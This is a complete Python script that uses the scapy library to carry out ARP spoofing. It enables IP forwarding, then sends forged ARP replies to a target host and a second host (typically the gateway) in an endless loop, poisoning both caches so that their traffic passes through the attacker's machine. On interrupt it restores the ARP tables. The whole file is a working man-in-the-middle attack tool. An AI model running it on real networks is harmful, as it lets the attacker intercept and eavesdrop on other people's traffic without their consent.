#! /usr/bin/env python
import sys
import subprocess
import scapy.all as scapy
import argparse
import time


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP ")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof IP ")
    option = parser.parse_args()
    return option


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcust = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcust = broadcust / arp_request
    answer_list = scapy.srp(arp_request_broadcust, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_network(src_ip, des_ip):
    src_mac = get_mac(src_ip)
    dest_mac = get_mac(des_ip)
    packet = scapy.ARP(op=2, pdst=des_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def ip_forward():
    subprocess.call("sysctl -w net.ipv4.ip_forward=1", shell=True)
    print("Forwarded...")


option = get_argument()
ip_forward()
packet_no = 0
try:
    while True:
        spoof(option.target, option.spoof)
        spoof(option.spoof, option.target)
        if packet_no == 0:
            print("\r[+] Packet sending ..  "),
            packet_no = 1
        elif packet_no == 1:
            print("\r[+] Packet sending ... "),
            packet_no = 2
        elif packet_no == 2:
            print("\r[+] Packet sending ...."),
            packet_no = 0
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Ctrl+C Detected... Reseting APR table. Please wait...")
    restore_network(option.target, option.spoof)
    restore_network(option.spoof, option.target)
